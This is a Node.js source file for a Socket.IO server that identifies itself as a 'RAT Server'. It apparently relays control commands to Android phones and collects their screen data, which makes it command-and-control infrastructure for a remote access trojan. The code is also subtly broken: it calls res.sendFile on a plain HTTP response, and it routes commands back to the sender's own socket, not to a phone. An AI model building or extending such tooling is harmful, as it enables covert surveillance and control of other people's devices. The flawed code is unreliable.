const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

// Create an HTTP server
const server = http.createServer();

// Attach Socket.io to the server
const io = socketIo(server);

// IMPORTANT: Serve the Socket.IO client library so the Android app can load it
server.on('request', (req, res) => {
    if (req.url === '/socket.io/socket.io.js') {
        res.sendFile(path.join(__dirname, 'node_modules', 'socket.io-client', 'dist', 'socket.io.js'));
    } else {
        // If it's not the client library, send a simple response
        res.writeHead(200);
        res.end('RAT Server is Running');
    }
});

io.on('connection', (socket) => {
    console.log('User connected:', socket.id);

    socket.on('control-command', (data) => {
        // Send command to the specific phone
        io.to(socket.id).emit('execute-command', data);
    });

    socket.on('screen-data', (data) => {
        console.log('Phone screen update:', data);
    });
    
    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
